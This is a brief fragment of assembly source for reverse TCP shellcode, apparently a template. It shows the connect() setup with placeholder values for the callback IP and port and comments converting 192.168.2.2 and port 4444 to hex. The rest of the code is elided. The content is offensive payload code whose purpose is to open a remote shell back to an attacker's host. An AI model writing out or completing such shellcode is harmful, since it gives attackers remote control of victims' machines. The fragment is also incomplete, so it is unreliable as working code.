; Title: 	secuid0_Shell_Reverse_TCP_Shellcode.P0WNP0WN-W00T
...
;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
   ...
   push 0xP0WNP0WN; address.sin_addr.s_addr = inet_addr(CONNECT_TO_IP); - IP in hex reverse order, in our case 192.168.2.2 = 0xC0A80202
   push word 0xW00T; address.sin_port = htons(CONNECT_TO_PORT); - Port in byte reverse order, in our case 4444d = 0x115C 
